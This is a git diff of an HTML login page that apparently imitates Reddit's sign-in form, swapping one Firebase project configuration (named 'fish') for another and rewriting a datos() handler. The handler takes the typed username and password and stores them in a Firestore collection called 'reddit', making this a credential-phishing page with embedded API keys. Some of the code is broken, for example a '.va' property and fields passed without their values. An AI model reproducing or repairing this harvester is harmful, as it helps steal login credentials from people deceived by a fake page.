@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in 123</button>
+                <button  type="submit" onclick="datos()">Log in</button>
               </fieldset>
 
 
@@ -246,45 +246,31 @@
 </body>
 
 <!-- The core Firebase JS SDK is always required and must be listed first -->
-<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase.js"></script>
-<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-app.js"></script>
-<!-- TODO: Add SDKs for Firebase products that you want to use
-     https://firebase.google.com/docs/web/setup#available-libraries -->
-<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-analytics.js"></script>
-<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-firestore.js"></script>
-<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.1/firebase-firestore.js"></script>
 
 <script>
   // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
   var firebaseConfig = {
-    apiKey: "AIzaSyBO-rs4u-ImBQ11NrvoRn0uYPglZgCBU5s",
-    authDomain: "fish-61f52.firebaseapp.com",
-    databaseURL: "https://fish-61f52.firebaseio.com",
-    projectId: "fish-61f52",
-    storageBucket: "fish-61f52.appspot.com",
-    messagingSenderId: "393755273794",
-    appId: "1:393755273794:web:57798a2d47eef6e24a5bdb",
-    measurementId: "G-F5XQVVFKL4"
+    apiKey: "AIzaSyCfNFhLOrTZPIFkM0WCJvstrBmm8QUSL0I",
+    authDomain: "autenticacion-2d7fd.firebaseapp.com",
+    databaseURL: "https://autenticacion-2d7fd.firebaseio.com",
+    projectId: "autenticacion-2d7fd",
+    storageBucket: "autenticacion-2d7fd.appspot.com",
+    messagingSenderId: "332723777846",
+    appId: "1:332723777846:web:c4a59aa407ab2adaba0397"
   };
   // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
-  firebase.analytics();
-  var db = firebase.firestore();
+  const auth = firebase.auth();
+  const db = firebase.firestore();
 
   function datos() {
-    var emailvalue = document.getElementById("loginUsername");
+    var emailvalue = document.getElementById("loginUsername").va;
     var passvalue = document.getElementById("loginPassword");
 
-
-    
-    /*var database = firebase.database();
-    database.ref().child("Reddit").set({
-      email: emailvalue,
-      password: passvalue
-    });*/
-
-    db.collection('Reddit').doc().set()({
+    db.collection('reddit').add({
       email: emailvalue,
       password: passvalue
     })
